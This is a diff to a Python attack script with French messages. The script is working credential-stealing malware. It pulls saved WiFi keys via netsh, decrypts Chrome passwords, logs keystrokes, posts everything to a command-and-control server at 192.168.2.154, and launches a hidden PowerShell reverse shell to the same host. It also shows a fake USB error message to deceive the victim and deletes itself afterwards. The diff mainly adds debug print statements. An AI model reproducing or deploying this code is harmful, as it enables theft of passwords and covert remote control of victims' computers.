@@ -12,7 +12,7 @@ from pynput.keyboard import Listener
 
 def extract_wifi_creds():
     try:
-        print("Lancement de netsh wlan show profiles avec admin...")
+        print("Tentative d'extraction WiFi (admin requis)...")
         profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, stderr=subprocess.STDOUT)
         print("Sortie netsh profiles:", profiles_output)
         wifi_data = {}
@@ -23,7 +23,6 @@ def extract_wifi_creds():
                 current_profile = line.split(':')[1].strip()
                 print(f"Profil detecte: {current_profile}")
                 try:
-                    print(f"Essai d'extraction pour {current_profile}...")
                     details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + current_profile + '"', 'key=clear'], text=True, stderr=subprocess.STDOUT)
                     print("Sortie netsh details:", details)
                     for detail in details.split('\n'):
@@ -31,17 +30,20 @@ def extract_wifi_creds():
                             key_value = detail.split(':')[1].strip()
                             if key_value:
                                 wifi_data[current_profile] = key_value
-                                print(f"Clé trouvee: {current_profile}: {key_value}")
+                                print(f"Clé WiFi trouvee: {current_profile}: {key_value}")
                 except subprocess.CalledProcessError as e:
                     print(f"Erreur pour {current_profile}: {e.output}")
-        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi trouve ou acces refuse (admin requis)"}
+        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi ou acces refuse (admin requis)"}
     except subprocess.CalledProcessError as e:
+        print(f"Erreur netsh generale: {e.output}")
         return {"error": f"Commande netsh echouee: {e.output}"}
     except Exception as e:
+        print(f"Erreur inattendue WiFi: {e}")
         return {"error": f"Erreur inattendue: {e}"}
 
 def extract_browser_creds():
     try:
+        print("Tentative d'extraction Chrome...")
         local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.loads(f.read())
@@ -51,6 +53,7 @@ def extract_browser_creds():
 
         chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
         if not os.path.exists(chrome_db):
+            print("Chrome DB non trouve")
             return [{"error": "Chrome DB not found"}]
         temp_db = os.path.expanduser(r'~\AppData\Local\Temp\LoginData.db')
         os.system(f'copy "{chrome_db}" "{temp_db}"')
@@ -72,12 +75,15 @@ def extract_browser_creds():
                 else:
                     password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                 credentials.append({"url": url, "username": username, "password": password})
-            except:
+                print(f"Credential trouvee: {url} - {username}: {password}")
+            except Exception as e:
+                print(f"Erreur decryption: {e}")
                 continue
         conn.close()
         os.remove(temp_db)
         return credentials
-    except:
+    except Exception as e:
+        print(f"Erreur Chrome generale: {e}")
         return [{"error": "Browser extraction failed"}]
 
 def capture_keystrokes(duration=60):
@@ -98,23 +104,27 @@ def capture_keystrokes(duration=60):
 def send_to_c2(data):
     c2_url = "http://192.168.2.154:8080"
     try:
+        print(f"Envoi au C2: {data}")
         requests.post(c2_url, json=data, timeout=10)
-    except:
-        pass
+        print("Envoi au C2 reussi")
+    except Exception as e:
+        print(f"Echec envoi C2: {e}")
 
 def open_reverse_shell():
     try:
+        print("Tentative d'ouverture du reverse shell...")
         ps_command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.2.154", 4444);' + \
                     '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;' + \
                     '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );' + \
                     '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
         subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', ps_command])
-    except:
-        pass
+        print("Reverse shell tente")
+    except Exception as e:
+        print(f"Erreur reverse shell: {e}")
 
 if __name__ == "__main__":
     try:
-        print("Lancement de l'attaque...")
+        print("Debut de l'attaque...")
         time.sleep(random.randint(1, 10))
         print("Erreur USB detectee - Veuillez retirer et reinserer la cle.")
         wifi_data = extract_wifi_creds()
@@ -125,7 +135,8 @@ if __name__ == "__main__":
         open_reverse_shell()
         try:
             os.remove(__file__)
-        except:
-            pass
+            print("Nettoyage du fichier termine")
+        except Exception as e:
+            print(f"Erreur nettoyage: {e}")
     except Exception as e:
-        print(f"Erreur lors de l'execution : {e}")
+        print(f"Erreur principale: {e}")
